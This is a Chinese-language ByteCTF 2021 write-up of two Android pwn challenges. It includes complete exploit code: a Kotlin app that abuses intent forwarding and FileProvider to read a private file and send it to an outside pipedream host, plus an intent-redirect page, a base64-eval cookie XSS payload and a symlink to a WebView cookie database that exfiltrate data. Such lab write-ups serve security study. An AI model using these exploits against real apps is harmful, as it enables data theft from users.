---
title: ByteCTF 2021
date: 2021-10-17 20:01:43
tags:
    - CTF
    - Android
categories:
    - CTF
---
Android Pwn 真好玩。

<!-- more -->

# Pwn
## babydroid
Flag 被写入应用私有的文件存储区，但是注意到提供了 `androidx.core.content.FileProvider`，可以实现文件读取。
```xml
<provider android:name="androidx.core.content.FileProvider" android:exported="false" android:authorities="androidx.core.content.FileProvider" android:grantUriPermissions="true">
    <meta-data android:name="android.support.FILE_PROVIDER_PATHS" android:resource="@xml/file_paths"/>
</provider>
```
默认情况下，不能从外面直接访问提供的文件，但是 Android 提供了在发送 `Intent` 的同时对里面包含的 URL 进行授权的[机制](https://developer.android.com/reference/androidx/core/content/FileProvider#Permissions)，同时发现 `Vulnerable` 会把包含在启动用的 `Intent` 中的内容以自己的身份发送出去，并且我们可以完全控制其中的内容，于是构造 URL 以获取读取权限。
```kotlin
package com.bytectf.pwnbabydroid

import android.content.ComponentName
import android.content.Intent
import android.net.Uri
import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import android.util.Log
import androidx.core.content.FileProvider.getUriForFile
import com.github.kittinunf.fuel.httpGet
import java.io.File
import java.nio.charset.Charset

class MainActivity : AppCompatActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        if (intent.getBooleanExtra("test", false)) {
            val uri = intent.data!!
            Log.d("FLAG_URL", uri.toString())
            val input = contentResolver.openInputStream(uri)
            val flag = input?.readBytes()?.toString(Charset.defaultCharset())!!
            Log.d("FLAG", flag)
            "https://redacted.m.pipedream.net/".httpGet(
                parameters = listOf(
                    Pair(
                        "flag",
                        flag
                    )
                )
            ).responseString { request, response, result -> }
            return
        }


        val packedIntent = Intent(this, MainActivity::class.java).apply {
            putExtra("test", true)
            data =
                Uri.parse("content://androidx.core.content.FileProvider/root/data/data/com.bytectf.babydroid/files/flag")
            flags = Intent.FLAG_GRANT_READ_URI_PERMISSION
        }

        val i = Intent().apply {
            component = ComponentName("com.bytectf.babydroid", "com.bytectf.babydroid.Vulnerable")
            putExtra("intent", packedIntent)
        }
        startActivity(i)
    }
}
```

## easydroid
本题中，Flag 被写入 Webview 中位于 `tiktok.com` 的 Cookie 中。`MainActivity` 中对 URL 的验证存在问题，只需要域名中包含指定字符串即可，并且对 `intent:` 形式的[协议](https://developer.chrome.com/docs/multidevice/android/intents/)进行了特殊处理，从而可以启动任意活动并且传递参数。据此构建通用重定向页面。
```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
    <script>
        var h = "intent://#Intent;component=com.bytectf.easydroid/com.bytectf.easydroid.TestActivity;S.url=";
        window.location.href = h + window.location.hash.substr(1) + ";end;";
    </script>
</body>
</html>
```

根据 Hint 以及 [Evernote: Universal-XSS, theft of all cookies from all sites, and more](https://blog.oversecured.com/Evernote-Universal-XSS-theft-of-all-cookies-from-all-sites-and-more/) 一文的解析，发现可以通过符号链接以及设置 Cookie 的方式使浏览器把存储 Cookie 的 SQLite 数据库作为 HTML 页面解析，从而执行其中的脚本，实现 XSS。首先需要在以下页面停留40秒左右，等待数据库写入存储：
```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
    Hello World
    <script>
        src = 'new Image().src = "https://redacted.m.pipedream.net/?evil=" + encodeURIComponent(document.getElementsByTagName("html")[0].innerHTML);';
        document.cookie = "x = '<img src=\"x\" onerror=\"eval(atob('" + btoa(src) + "'))\">'"
    </script>
</body>
</html>
```

然后再打开符号链接的文件，实现 XSS（会把整个数据库的内容传输给攻击者）：
```kotlin
package com.bytectf.pwneasydroid

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.net.Uri
import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import android.os.Handler

class MainActivity : AppCompatActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        launch("http://toutiao.com.192.168.2.224.traefik.me:8000/cookie.html")
        Handler().postDelayed({-> launch("file://" + symlink())}, 45000)
    }


    public fun launch(url: String) {
        val i = Intent().apply {
            setClassName("com.bytectf.easydroid", "com.bytectf.easydroid.MainActivity")
            data = Uri.parse("http://toutiao.com.192.168.2.224.traefik.me:8000/redir.html#$url")
            flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TASK
        }
        startActivity(i)
    }

    fun symlink(): String {
        val root = applicationInfo.dataDir
        val symlink = "$root/symlink.html"
        val cookies = packageManager.getApplicationInfo("com.bytectf.easydroid", 0).dataDir + "/app_webview/Cookies"

        Runtime.getRuntime().exec("rm $symlink")
        Runtime.getRuntime().exec("ln -s $cookies $symlink")
        Runtime.getRuntime().exec("chmod -R 777 $root")

        return symlink
    }
}
```